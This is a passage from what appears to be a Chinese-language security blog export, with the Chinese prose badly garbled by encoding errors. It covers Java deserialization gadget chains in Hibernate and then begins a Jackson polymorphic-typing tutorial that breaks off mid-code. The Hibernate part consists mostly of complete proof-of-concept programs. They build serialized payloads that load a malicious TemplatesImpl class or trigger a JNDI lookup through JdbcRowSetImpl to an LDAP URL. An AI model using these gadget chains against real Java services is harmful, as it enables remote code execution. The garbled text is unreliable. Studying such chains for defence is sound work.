Exception ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(o); return byteArrayOutputStream.toByteArray(); public static Object unser(byte[] bytes) throws Exception ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes); ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream); return objectInputStream.readObject(); hibernate5ä¾èµ–å¯¼å…¥dependency groupIdorg.hibernate/groupId artifactIdhibernate-core/artifactId version4.3.11.Final/version/dependency åœ¨ä¾èµ–æ›´æ–°å®Œäº†ä¹‹åæˆ‘ä»¬å†çœ‹ä¸Šé¢çš„pocï¼Œä¼šçœ‹åˆ°æŠ¥é”™å¦‚ä¸‹ Getterå’ŒGetterMethodImplç±»åœ¨Hibernateç‰ˆæœ¬ä¸º4çš„æ—¶å€™éƒ½ä¸å­˜åœ¨ æ‰€ä»¥æˆ‘ä»¬éœ€è¦åœ¨è¿™ä¸ªç‰ˆæœ¬æ‰¾ä¸€ä¸ªå¹³æ›¿çš„ åœ¨å°äº5.0çš„hiberateä¸‹ï¼Œå­˜åœ¨BasicPropertyAccessor.BasicGetter.get() å’Œå‰é¢çš„GetterMethodImplä¸­çš„get()æ–¹æ³•å‡ ä¹ä¸€æ¨¡ä¸€æ · ä½†æ˜¯å¾ˆå¯æƒœçš„æ˜¯è¿™é‡Œçš„methodå‚æ•°æ˜¯transientçš„ï¼Œtransientä¿®é¥°çš„å‚æ•°ä¸ä¼šå‚ä¸è¿›ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ ä½†æ˜¯åœ¨BasicPropertyAccessor.BasicGetterä¸­æœ‰ä¸€ä¸ªæ–¹æ³•å«åšreadResolve()æ–¹æ³•(åœ¨lab5ä¸­æœ‰æåŠåˆ°)ï¼Œåœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­åªè¦è¯¥æ–¹æ³•æœ‰è¢«å®šä¹‰ï¼Œé‚£ä¹ˆå°±ä¸€å®šä¼šè¢«è°ƒç”¨ æˆ‘ä»¬è·Ÿè¿›createGetteræ–¹æ³• ç»§ç»­è·Ÿè¿›getGetterOrNullæ–¹æ³• è¯¥æ–¹æ³•é‡Œé¢é€šè¿‡getterMethodå‡½æ•°æ¥è·å–methodï¼Œè¦æ˜¯è·å–åˆ°äº†çš„è¯é‚£ä¹ˆå°±ä¼šè¿”å›ä¸€ä¸ªBasicGetterå¯¹è±¡ æˆ‘ä»¬è·Ÿè¿›getterMethodæ–¹æ³• æˆ‘ä»¬å¯ä»¥çŸ¥é“methodå…¶å®å°±æ˜¯ä»theClassä¸­è·å–åˆ°æ‰€æœ‰ä¸propertyNameåŒå€¼çš„getter(getæˆ–è€…æ˜¯iså¼€å¤´çš„) åˆ°è¿™é‡Œæˆ‘ä»¬å·®ä¸å¤šå°±çŸ¥é“äº†åé¢ç›¸å…³éƒ¨åˆ†è¦æ€ä¹ˆæ”¹åŠ¨äº† æˆ‘ä»¬éœ€è¦ç»™BasicGetterçš„clazzå‚æ•°èµ‹ä¸€ä¸ªåŒ…å«æœ‰getteræ¼æ´çš„classï¼Œç„¶åpropertyNameå‚æ•°çš„å€¼è¦ä¸ºgetterå¯¹åº”çš„å±æ€§å ä¸¾ä¸ªä¾‹å­ï¼Œæˆ‘ä»¬è¦åˆ©ç”¨TemplatesImplä¸­çš„getOutputProperties()æ–¹æ³•ï¼Œé‚£ä¹ˆclassçš„å€¼å°±æ˜¯TemplatesImplçš„classï¼Œç„¶åpropertyNameçš„å€¼å°±æ˜¯OutputProperties çœ‹ä¸€ä¸‹BasicGetterçš„æ„é€ å‡½æ•° æ˜¯ç§æœ‰çš„ï¼Œé‚£æˆ‘ä»¬å°±éœ€è¦ç”¨åˆ°åå°„æ¥è¿›è¡Œèµ‹å€¼ åˆ›å»ºä¸€ä¸ªBasicGetterï¼ˆMethodçš„èµ‹å€¼éšæ„ï¼Œé‡ç‚¹åœ¨äºpropertyNameï¼‰ Class basicGetterClass = BasicPropertyAccessor.BasicGetter.class;Constructor basicGetterConstructor = basicGetterClass.getDeclaredConstructor(new Class[]Class.class,Method.class,String.class);basicGetterConstructor.setAccessible(true);BasicPropertyAccessor.BasicGetter basicGetter = (BasicPropertyAccessor.BasicGetter) basicGetterConstructor.newInstance(TemplatesImpl.class,TemplatesImpl.class.getDeclaredMethod(getOutputProperties),OutputProperties); ç¨å¾®æ”¹ä¸€ä¸‹gettersæ•°ç»„ Class? c = AbstractComponentTuplizer.class;Field field = c.getDeclaredField(getters);field.setAccessible(true);field.set(pojoComponentTuplizer,new Getter[]basicGetter); æˆåŠŸè§¦å‘poc package org.example;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import org.hibernate.engine.spi.TypedValue;import org.hibernate.property.BasicPropertyAccessor;import org.hibernate.property.Getter;import org.hibernate.tuple.component.AbstractComponentTuplizer;import org.hibernate.tuple.component.PojoComponentTuplizer;import org.hibernate.type.ComponentType;import sun.reflect.ReflectionFactory;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.lang.reflect.Method;import java.nio.file.Files;import java.nio.file.Paths;import java.util.Base64;import java.util.HashMap;public class Main public static void main(String[] args) throws Exception HashMapObject,Object hashMap = new HashMap(); ComponentType componentType = (ComponentType) createObjWithoutConstructor(ComponentType.class); setField(componentType,propertySpan,2); TypedValue typedValue = new TypedValue(componentType,getTemplateImpl()); Class basicGetterClass = BasicPropertyAccessor.BasicGetter.class; Constructor basicGetterConstructor = basicGetterClass.getDeclaredConstructor(new Class[]Class.class,Method.class,String.class); basicGetterConstructor.setAccessible(true); BasicPropertyAccessor.BasicGetter basicGetter = (BasicPropertyAccessor.BasicGetter) basicGetterConstructor.newInstance(TemplatesImpl.class,TemplatesImpl.class.getDeclaredMethod(getOutputProperties),OutputProperties); PojoComponentTuplizer pojoComponentTuplizer = (PojoComponentTuplizer) createObjWithoutConstructor(PojoComponentTuplizer.class); Class? c = AbstractComponentTuplizer.class; Field field = c.getDeclaredField(getters); field.setAccessible(true); field.set(pojoComponentTuplizer,new Getter[]basicGetter); setField(componentType,componentTuplizer,pojoComponentTuplizer); hashMap.put(1,1); Field tableField = HashMap.class.getDeclaredField(table); tableField.setAccessible(true); Object[] table = (Object[]) tableField.get(hashMap); for (Object entry: table) if (entry != null) setField(entry,key,typedValue); byte[] bytes = ser(hashMap); System.out.println(Base64.getEncoder().encodeToString(bytes)); unser(bytes); public static Object createObjWithoutConstructor(Class clazz) throws Exception ReflectionFactory reflectionFactory = ReflectionFactory.getReflectionFactory(); ConstructorObject constructor = Object.class.getDeclaredConstructor(); Constructor? constructor1 = reflectionFactory.newConstructorForSerialization(clazz,constructor); constructor1.setAccessible(true); return constructor1.newInstance(); public static void setField(Object object,String fieldName,Object value) throws Exception Class? c = object.getClass(); Field field = c.getDeclaredField(fieldName); field.setAccessible(true); field.set(object,value); public static TemplatesImpl getTemplateImpl() throws Exception ClassLoader classLoader = ClassLoader.getSystemClassLoader(); byte[] bytes = Files.readAllBytes(Paths.get(E:\\\\mycode\\\\tmp\\\\Test.class)); Class? c = Class.forName(java.lang.ClassLoader); Method m = c.getDeclaredMethod(defineClass, byte[].class, int.class, int.class); m.setAccessible(true); Class? c1 = (Class?) m.invoke(classLoader,bytes,0,bytes.length); TemplatesImpl templates = new TemplatesImpl(); Class? templatesClass = templates.getClass(); Field _classField = templatesClass.getDeclaredField(_class); _classField.setAccessible(true); _classField.set(templates,new Class[]c1); Field _nameField = templatesClass.getDeclaredField(_name); _nameField.setAccessible(true); _nameField.set(templates,666); Field _transletIndexField = templatesClass.getDeclaredField(_transletIndex); _transletIndexField.setAccessible(true); _transletIndexField.set(templates,0); Field _tfactoryField = templatesClass.getDeclaredField(_tfactory); _tfactoryField.setAccessible(true); _tfactoryField.set(templates,new TransformerFactoryImpl()); return templates; public static byte[] ser(Object o) throws Exception ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(o); return byteArrayOutputStream.toByteArray(); public static Object unser(byte[] bytes) throws Exception ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes); ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream); return objectInputStream.readObject(); hibernate2ä¾ç„¶çœ‹ä¸€ä¸‹ysoé‡Œé¢æä¾›çš„é“¾å­ /** * javax.naming.InitialContext.InitialContext.lookup() * com.sun.rowset.JdbcRowSetImpl.connect() * com.sun.rowset.JdbcRowSetImpl.getDatabaseMetaData() * org.hibernate.property.access.spi.GetterMethodImpl.get() * org.hibernate.tuple.component.AbstractComponentTuplizer.getPropertyValue() * org.hibernate.type.ComponentType.getPropertyValue(C) * org.hibernate.type.ComponentType.getHashCode() * org.hibernate.engine.spi.TypedValue$1.initialize() * org.hibernate.engine.spi.TypedValue$1.initialize() * org.hibernate.internal.util.ValueHolder.getValue() * org.hibernate.engine.spi.TypedValue.hashCode() */ ä»ä¸Šé¢çš„é“¾å­å¯çŸ¥å¤§éƒ¨åˆ†å’ŒHibernate1çš„å·®ä¸å¤šï¼Œåªéœ€è¦æ”¹ä¸€ä¸‹getteræ•°ç»„çš„å€¼å°±å¯ä»¥äº† è¿™é‡Œåˆ©ç”¨çš„æ˜¯jndiæ³¨å…¥æ¼æ´ï¼Œéœ€è¦å‰é¢åœ¨fastjsonä¸­æåˆ°çš„JdbcRowSetImpl ä¹‹å‰ç”±äºåœ¨fastjsonä¸­å¯¹äºgetterè°ƒç”¨çš„æ¡ä»¶æ¯”è¾ƒä¸¥æ ¼ï¼Œæ‰€ä»¥å¹¶æ²¡æœ‰ç”¨ä¸Šè¿™ä¸ªgetteræ–¹æ³•ï¼Œä½†æ˜¯è¿™ä¸€æ¬¡çš„hiberateé“¾ä¸­å¯ä»¥å®ç°ä»»æ„getterè°ƒç”¨ pocåªéœ€è¦ç¨å¾®ä¿®æ”¹ä¸€æ‰‹ï¼Œå¦‚ä¸‹ package org.example;import com.sun.rowset.JdbcRowSetImpl;import org.hibernate.engine.spi.TypedValue;import org.hibernate.property.access.spi.Getter;import org.hibernate.property.access.spi.GetterMethodImpl;import org.hibernate.tuple.component.AbstractComponentTuplizer;import org.hibernate.tuple.component.PojoComponentTuplizer;import org.hibernate.type.ComponentType;import sun.reflect.ReflectionFactory;import javax.sql.rowset.BaseRowSet;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.util.Base64;import java.util.HashMap;public class Main public static void main(String[] args) throws Exception HashMapObject,Object hashMap = new HashMap(); ComponentType componentType = (ComponentType) createObjWithoutConstructor(ComponentType.class); setField(componentType,propertySpan,2); PojoComponentTuplizer pojoComponentTuplizer = (PojoComponentTuplizer) createObjWithoutConstructor(PojoComponentTuplizer.class); JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl(); Class c0 = BaseRowSet.class; Field dataSourceField = c0.getDeclaredField(dataSource); dataSourceField.setAccessible(true); dataSourceField.set(jdbcRowSet,ldap://127.0.0.1:10389/cn=test,dc=example,dc=com); Class? c = AbstractComponentTuplizer.class; Field field = c.getDeclaredField(getters); field.setAccessible(true); field.set(pojoComponentTuplizer,new Getter[]new GetterMethodImpl(Object.class,qwq, JdbcRowSetImpl.class.getDeclaredMethod(getDatabaseMetaData))); setField(componentType,componentTuplizer,pojoComponentTuplizer); hashMap.put(1,1); TypedValue typedValue = new TypedValue(componentType,jdbcRowSet); Field tableField = HashMap.class.getDeclaredField(table); tableField.setAccessible(true); Object[] table = (Object[]) tableField.get(hashMap); for (Object entry: table) if (entry != null) setField(entry,key,typedValue); byte[] bytes = ser(hashMap); System.out.println(Base64.getEncoder().encodeToString(bytes)); unser(bytes); public static Object createObjWithoutConstructor(Class clazz) throws Exception ReflectionFactory reflectionFactory = ReflectionFactory.getReflectionFactory(); ConstructorObject constructor = Object.class.getDeclaredConstructor(); Constructor? constructor1 = reflectionFactory.newConstructorForSerialization(clazz,constructor); constructor1.setAccessible(true); return constructor1.newInstance(); public static void setField(Object object,String fieldName,Object value) throws Exception Class? c = object.getClass(); Field field = c.getDeclaredField(fieldName); field.setAccessible(true); field.set(object,value); public static byte[] ser(Object o) throws Exception ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(o); return byteArrayOutputStream.toByteArray(); public static Object unser(byte[] bytes) throws Exception ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes); ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream); return objectInputStream.readObject();","categories":["javaååºåˆ—åŒ–"]},{"title":"javaååºåˆ—åŒ–ä¹‹jackson","path":"/2025/03/03/javaååºåˆ—åŒ–ä¹‹jackson/","content":"å¼•ç”¨æ·±å…¥æµ…å‡ºè§£æJacksonååºåˆ—åŒ– å‰è¨€jacksonç›¸å…³åŸºç¡€çŸ¥è¯†è¿™é‡Œå°±ä¸èµ˜è¿°äº†ï¼Œå¯å‚çœ‹å¼•ç”¨ é€»è¾‘è·Ÿfastjsonå·®ä¸å¤š jacksonç®€å•ä½¿ç”¨ä¾èµ– dependencies dependency groupIdcom.fasterxml.jackson.core/groupId artifactIdjackson-databind/artifactId version2.9.3/version /dependency dependency groupIdcom.fasterxml.jackson.core/groupId artifactIdjackson-core/artifactId version2.9.3/version /dependency dependency groupIdcom.fasterxml.jackson.core/groupId artifactIdjackson-annotations/artifactId version2.9.3/version /dependency /dependencies ObjectMapperå°†JSONæ˜ å°„åˆ°Javaå¯¹è±¡ï¼ˆååºåˆ—åŒ–ï¼‰ï¼Œæˆ–è€…å°†Javaå¯¹è±¡æ˜ å°„åˆ°JSONï¼ˆåºåˆ—åŒ–ï¼‰ Personç±» package org.example;class Person private String name; private int age; // å¿…é¡»æä¾›æ— å‚æ„é€ å‡½æ•° public Person() System.out.println(Person constructor); public String getName() System.out.println(Person.getName()); return name; public void setName(String name) System.out.println(Person.setName()); this.name = name; public int getAge() System.out.println(Person.getAge()); return age; public void setAge(int age) System.out.println(Person.setAge()); this.age = age; å°†jsonè½¬æ¢ä¸ºå¯¹è±¡ package org.example;import com.fasterxml.jackson.databind.ObjectMapper;public class Main public static void main(String[] args) throws Exception String json = ame\\:\\John\\, \\age\\:30; ObjectMapper objectMapper = new ObjectMapper(); Person person = objectMapper.readValue(json, Person.class); System.out.println(Name: + person.getName()); System.out.println(Age: + person.getAge()); å°†å¯¹è±¡è½¬æ¢ä¸ºjson writeValue()ï¼šå°†å¯¹è±¡åºåˆ—åŒ–ä¸º JSON å¹¶å†™å…¥æ–‡ä»¶ã€è¾“å‡ºæµæˆ– Writerã€‚ writeValueAsString()ï¼šå°†å¯¹è±¡åºåˆ—åŒ–ä¸º JSON å­—ç¬¦ä¸²ã€‚ writeValueAsBytes()ï¼šå°†å¯¹è±¡åºåˆ—åŒ–ä¸º JSON å­—èŠ‚æ•°ç»„ package org.example;import com.fasterxml.jackson.databind.ObjectMapper;public class Main public static void main(String[] args) throws Exception ObjectMapper objectMapper = new ObjectMapper(); Person person = new Person(); person.setAge(21); person.setName(Sherlock); String jsonstring = objectMapper.writeValueAsString(person); System.out.println(jsonstring); JsonParserJackson JsonParserç±»æ˜¯ä¸€ä¸ªåº•å±‚ä¸€äº›çš„JSONè§£æå™¨ Jackson JsonParserçš„è¿è¡Œå±‚çº§ä½äºJackson ObjectMapperã€‚ è¿™ä½¿å¾—JsonParseræ¯”ObjectMapperæ›´å¿«ï¼Œä½†ä½¿ç”¨èµ·æ¥ä¹Ÿæ¯”è¾ƒéº»çƒ¦ ä½¿ç”¨JsonParseréœ€è¦å…ˆåˆ›å»ºä¸€ä¸ªJsonFactory package org.example;import com.fasterxml.jackson.core.JsonFactory;import com.fasterxml.jackson.core.JsonParser;public class Main public static void main(String[] args) throws Exception String json = ame\\:\\John\\, \\age\\:30; JsonFactory jsonFactory = new JsonFactory(); JsonParser parser = jsonFactory.createParser(json); System.out.println(parser); ä¸€æ—¦åˆ›å»ºäº†Jackson JsonParserï¼Œå°±å¯ä»¥ä½¿ç”¨å®ƒæ¥è§£æJSONï¼›JsonParserçš„å·¥ä½œæ–¹å¼æ˜¯å°†JSONåˆ†è§£ä¸ºä¸€ç³»åˆ—ä»¤ç‰Œï¼Œå¯ä»¥ä¸€ä¸ªä¸€ä¸ªåœ°è¿­ä»£ä»¤ç‰Œ å¯ä»¥ä½¿ç”¨JsonParserçš„nextToken()è·å¾—ä¸€ä¸ªJsonTokenã€‚ å¯ä»¥ä½¿ç”¨æ­¤JsonTokenå®ä¾‹æ£€æŸ¥ç»™å®šçš„ä»¤ç‰Œ ä»¤ç‰Œç±»å‹ç”±JsonTokenç±»ä¸­çš„ä¸€ç»„å¸¸é‡è¡¨ç¤ºã€‚ è¿™äº›å¸¸é‡æ˜¯ package org.example;import com.fasterxml.jackson.core.JsonFactory;import com.fasterxml.jackson.core.JsonParser;import com.fasterxml.jackson.core.JsonToken;public class Main public static void main(String[] args) throws Exception String json = ame\\:\\John\\, \\age\\:30; JsonFactory jsonFactory = new JsonFactory(); JsonParser parser = jsonFactory.createParser(json); while(!parser.isClosed()) JsonToken jsonToken = parser.nextToken(); System.out.println(jsonToken); START_OBJECTFIELD_NAMEVALUE_STRINGFIELD_NAMEVALUE_NUMBER_INTEND_OBJECTnull æŒ‡å‘çš„ä»¤ç‰Œæ˜¯å­—ç¬¦ä¸²å­—æ®µå€¼ï¼Œåˆ™getValueAsString()è¿”å›å½“å‰ä»¤ç‰Œå€¼ä½œä¸ºå­—ç¬¦ä¸²ã€‚ å¦‚æœæŒ‡å‘çš„ä»¤ç‰Œæ˜¯æ•´æ•°å­—æ®µå€¼ï¼Œåˆ™getValueAsInt()è¿”å›å½“å‰ä»¤ç‰Œå€¼ä½œä¸ºintå€¼ã€‚ JsonParserå…·æœ‰æ›´å¤šç±»ä¼¼çš„æ–¹æ³•æ¥è·å–ä¸åŒç±»å‹çš„currenä»¤ç‰Œå€¼ï¼ˆä¾‹å¦‚booleanï¼Œshortï¼Œlongï¼Œfloatï¼Œdoubleç­‰ï¼‰ã€‚ ï¼ˆä¸‹è¿°ä¾‹å­ä¸­Prersonç±»çš„å±æ€§å…ˆæ”¹ä¸ºpublicç±»å‹ï¼‰ package org.example;import com.fasterxml.jackson.core.JsonFactory;import com.fasterxml.jackson.core.JsonParser;import com.fasterxml.jackson.core.JsonToken;public class Main public static void main(String[] args) throws Exception String json = ame\\:\\John\\, \\age\\:30; JsonFactory jsonFactory = new JsonFactory(); Person person = new Person(); JsonParser parser = jsonFactory.createParser(json); while(!parser.isClosed()) JsonToken jsonToken = parser.nextToken(); if (JsonToken.FIELD_NAME.equals(jsonToken)) String fieldName = parser.getCurrentName(); System.out.println(fieldName); jsonToken = parser.nextToken(); if (name.equals(fieldName)) person.name = parser.getValueAsString(); else if (age.equals(fieldName)) person.age = parser.getValueAsInt(); System.out.println(persons name is + person.name); System.out.println(persons age is + person.age); JsonGeneratorç”¨äºä»Javaå¯¹è±¡ï¼ˆæˆ–ä»£ç ä»ä¸­ç”ŸæˆJSONçš„ä»»ä½•æ•°æ®ç»“æ„ï¼‰ç”ŸæˆJSON ä½¿ç”¨JsonGeneratorä¹Ÿéœ€è¦å…ˆåˆ›å»ºä¸€ä¸ªJsonFactory ä»å…¶ä¸­ä½¿ç”¨createGenerator() æ¥åˆ›å»ºä¸€ä¸ªJsonGenerator package org.example;import com.fasterxml.jackson.core.*;import java.io.File;public class Main public static void main(String[] args) throws Exception JsonFactory jsonFactory = new JsonFactory(); Person person = new Person(); JsonGenerator jsonGenerator = jsonFactory.createGenerator(new File(output.json), JsonEncoding.UTF8); jsonGenerator.writeStartObject(); jsonGenerator.writeStringField(name, Sherlock); jsonGenerator.writeNumberField(age, 21); jsonGenerator.writeEndObject(); jsonGenerator.close(); å¤šæ€é—®é¢˜çš„è§£å†³å¤§å®¶éƒ½çŸ¥é“Javaçš„å¤šæ€å°±æ˜¯åŒä¸€ä¸ªæ¥å£ä½¿ç”¨ä¸åŒçš„å®ä¾‹è€Œæ‰§è¡Œä¸åŒçš„æ“ä½œ åœ¨Jacksonä¸­ JacksonPolymorphicDeserializationå¯ä»¥è§£å†³è¿™ä¸ªé—®é¢˜ åœ¨ååºåˆ—åŒ–æŸä¸ªç±»å¯¹è±¡çš„è¿‡ç¨‹ä¸­ å¦‚æœç±»çš„æˆå‘˜ä¸æ˜¯å…·ä½“ç±»å‹ æ¯”å¦‚æ˜¯Object æ¥å£ æˆ–è€… æŠ½è±¡ç±» é‚£ä¹ˆå¯ä»¥åœ¨JSONå­—ç¬¦ä¸²ä¸­ æŒ‡å®šå…¶ç±»å‹ Jacksonå°†ç”Ÿæˆå…·ä½“ç±»å‹çš„å®ä¾‹ å…·ä½“æ¥è¯´å°±æ˜¯ å°†å…·ä½“çš„å­ç±»ä¿¡æ¯ç»‘å®šåœ¨åºåˆ—åŒ–çš„å†…å®¹ä¸­ ä»¥ä¾¿äºåç»­ååºåˆ—åŒ–çš„æ—¶å€™ ç›´æ¥å¾—åˆ°ç›®æ ‡å­ç±»å¯¹è±¡ æˆ‘ä»¬å¯ä»¥é€šè¿‡DefaultTyping å’Œ @JsonTypeInfo æ³¨è§£æ¥å®ç° DefaultTypingDefaultTyping æ˜¯ Jackson æä¾›çš„ä¸€ä¸ªæšä¸¾ç±»ï¼Œç”¨äºé…ç½®å¤šæ€ç±»å‹å¤„ç†ã€‚å®ƒå†³å®šäº†åœ¨åºåˆ—åŒ–å’Œååºåˆ—åŒ–æ—¶ï¼ŒJackson å¦‚ä½•å¤„ç†å¯¹è±¡çš„ç±»å‹ä¿¡æ¯ Jacksonæä¾›ä¸€ä¸ªenableDefaultTypingè®¾ç½® åŒ…å«å››ä¸ªå€¼ ä¸‹é¢ç®€å•åˆ†æä¸‹è¿™å››ä¸ªå€¼çš„ä½œç”¨ JAVA_LANG_OBJECTå½“è¢«åºåˆ—åŒ–æˆ–ååºåˆ—åŒ–çš„ç±»é‡Œçš„å±æ€§è¢«å£°æ˜ä¸ºä¸€ä¸ªObjectç±»å‹æ—¶ ä¼šå¯¹è¯¥Objectç±»å‹çš„å±æ€§è¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ– å¹¶æ˜ç¡®è§„å®šç±»å ä»…å¯¹ Object ç±»å‹çš„å±æ€§å¯ç”¨ç±»å‹ä¿¡æ¯åµŒå…¥ã€‚ ä¾‹å¦‚ï¼Œå¦‚æœä¸€ä¸ªå­—æ®µçš„ç±»å‹æ˜¯ Objectï¼ŒJackson ä¼šåœ¨åºåˆ—åŒ–æ—¶åµŒå…¥ç±»å‹ä¿¡æ¯ package jackson;import com.fasterxml.jackson.databind.ObjectMapper;public class JSTest public static void main(String[] args) throws Exception Person2 person2 = new Person2(); person2.age = 123; person2.name = fakes0u1; person2.object = new Hacker(); ObjectMapper objectMapper = new ObjectMapper(); objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.JAVA_LANG_OBJECT); String jsonstring = objectMapper.writeValueAsString(person2); System.out.println(jsonstring); Person2 p2 = objectMapper.readValue(jsonstring,Person2.class); System.out.println(p2); åœ¨è®¾ç½®äº†JAVA_LANG_OBJECTçš„æ—¶å€™ä¼šè¾“å‡º name:fakes0u1,age:123,object:[jackson.Hacker,skill:moyu]Person2.age=123,Person2.name=fakes0u1,jackson.Hacker@f6c48ac æ²¡è®¾ç½®çš„æ—¶å€™ä¼šè¾“å‡º name:fakes0u1,age:123,object:skill:moyuPerson2.age=123,Person2.name=fakes0u1,skill=moyu OBJECT_AND_NON_CONCRETEå¯¹ Object ç±»å‹ä»¥åŠéå…·ä½“ç±»å‹ï¼ˆå¦‚æŠ½è±¡ç±»ã€æ¥å£ï¼‰å¯ç”¨ç±»å‹ä¿¡æ¯åµŒå…¥ åŠ ä¸Šä¸€ä¸ªæ¥å£ package jackson;public interface Sex public void setSex(int sex); public int getSex(); å’Œå®ç°æ¥å£çš„ç±» package jackson;public class MySex implements Sex int sex; @Override public void setSex(int sex) this.sex = sex; @Override public int getSex() return sex; æœ€ååŠ ä¸ŠOBJECT_AND_NON_CONCRETEå‚æ•° package jackson;import com.fasterxml.jackson.databind.ObjectMapper;public class JSTest public static void main(String[] args) throws Exception Person2 person2 = new Person2(); person2.age = 123; person2.name = fakes0u1; person2.object = new Hacker(); person2.sex = new MySex(); ObjectMapper objectMapper = new ObjectMapper(); objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.OBJECT_AND_NON_CONCRETE); String jsonstring = objectMapper.writeValueAsString(person2); System.out.println(jsonstring); Person2 p2 = objectMapper.readValue(jsonstring,Person2.class); System.out.println(p2); //è¾“å‡ºç»“æœï¼šname:fakes0u1,age:123,object:[jackson.Hacker,skill:moyu],sex:[jackson.MySex,sex:0]Person2.age=123,Person2.name=fakes0u1,jackson.Hacker@239963d8,jackson.MySex@3abbfa04 å¯ä»¥çœ‹åˆ°æ¥å£ä¹Ÿè¢«æˆåŠŸçš„åºåˆ—åŒ–å’Œååºåˆ—åŒ– NON_CONCRETE_AND_ARRAYS å¯¹éå…·ä½“ç±»å‹ï¼ˆNon-Concrete Typesï¼‰å¯ç”¨ç±»å‹ä¿¡æ¯åµŒå…¥ï¼š éå…·ä½“ç±»å‹åŒ…æ‹¬æŠ½è±¡ç±»ï¼ˆAbstract Classesï¼‰å’Œæ¥å£ï¼ˆInterfacesï¼‰ã€‚ ä¾‹å¦‚ï¼Œå¦‚æœä¸€ä¸ªå­—æ®µçš„ç±»å‹æ˜¯ Listï¼ˆæ¥å£ï¼‰ï¼ŒJackson ä¼šåœ¨åºåˆ—åŒ–æ—¶åµŒå…¥ç±»å‹ä¿¡æ¯ã€‚ å¯¹æ•°ç»„ç±»å‹ï¼ˆArraysï¼‰å¯ç”¨ç±»å‹ä¿¡æ¯åµŒå…¥ï¼š æ•°ç»„ç±»å‹åŒ…æ‹¬åŸºæœ¬ç±»å‹æ•°ç»„ï¼ˆå¦‚ int[]ï¼‰å’Œå¯¹è±¡æ•°ç»„ï¼ˆå¦‚ String[]ï¼‰ã€‚ ä¾‹å¦‚ï¼Œå¦‚æœä¸€ä¸ªå­—æ®µçš„ç±»å‹æ˜¯ Object[]ï¼ŒJackson ä¼šåœ¨åºåˆ—åŒ–æ—¶åµŒå…¥ç±»å‹ä¿¡æ¯ package jackson;import com.fasterxml.jackson.databind.ObjectMapper;public class JSTest public static void main(String[] args) throws Exception Person2 person2 = new Person2(); person2.age = 123; person2.name = fakes0u1; Hacker[] hacker = new Hacker[2]; hacker[0] = new Hacker(); hacker[1] = new Hacker(); person2.object = hacker; person2.sex = new MySex(); ObjectMapper objectMapper = new ObjectMapper(); objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.OBJECT_AND_NON_CONCRETE); String jsonstring = objectMapper.writeValueAsString(person2); System.out.println(jsonstring); Person2 p2 = objectMapper.readValue(jsonstring,Person2.class); System.out.println(p2); name:fakes0u1,age:123,object:[[Ljackson.Hacker;,[skill:moyu,skill:moyu]],sex:[jackson.MySex,sex:0]Person2.age=123,Person2.name=fakes0u1,[Ljackson.Hacker;@e45f292,jackson.MySex@5f2108b5 è¿™é‡Œç›´æ¥å°±æ˜¯è¿™ç§å½¢å¼ Hacker[] hackers = new Hacker[2]; // åˆ›å»ºé•¿åº¦ä¸º 2 çš„ Hacker æ•°ç»„hackers[0] = new Hacker(Alice); // ä¸ºç¬¬ä¸€ä¸ªå…ƒç´ åˆ†é…ä¸€ä¸ª Hacker å¯¹è±¡hackers[1] = new Hacker(Bob); // ä¸ºç¬¬äºŒä¸ªå…ƒç´ åˆ†é…å¦ä¸€ä¸ª Hacker å¯¹è±¡ æ¯ä¸ªå…ƒç´ å¯ä»¥å­˜å‚¨ä¸€ä¸ªhackerå¯¹è±¡çš„å¼•ç”¨ è¿™é‡Œçš„æ•°ç»„ä¸­çš„å…ƒç´ å®é™…ä¸Šæ˜¯Hackerç±»çš„å¼•ç”¨ å¹¶ä¸æ˜¯å®é™…çš„å¯¹è±¡ éœ€è¦åœ¨ä½¿ç”¨ä¹‹å‰é€šè¿‡å®ä¾‹åŒ–æˆ–èµ‹å€¼æ“ä½œä¸ºæ•°ç»„å…ƒç´ åˆ†é…å®é™…çš„å¯¹è±¡ NON_FINALå¯¹æ‰€æœ‰é final ç±»å‹ï¼ˆå³å¯ä»¥è¢«å­ç±»åŒ–çš„ç±»å‹ï¼‰å¯ç”¨ç±»å‹ä¿¡æ¯åµŒå…¥ package jackson;public class Hacker public String skill = moyu;class Person2 public String name = null; public int age = 0; public Object object; public Sex sex; public Hacker hacker; @Override public String toString() return String.format(Person2.age=%d,Person2.name=%s,%s,%s,%s,age,name,object == null ? null : object,sex == null ? null : sex,hacker == null ? null : hacker); package jackson;import com.fasterxml.jackson.databind.ObjectMapper;public class JSTest public static void main(String[] args) throws Exception Person2 person2 = new Person2(); person2.age = 123; person2.name = fakes0u1; Hacker[] hacker = new Hacker[2]; hacker[0] = new Hacker(); hacker[1] = new Hacker(); person2.object = hacker; person2.sex = new MySex(); person2.hacker = new Hacker(); ObjectMapper objectMapper = new ObjectMapper(); objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL); String jsonstring = objectMapper.writeValueAsString(person2); 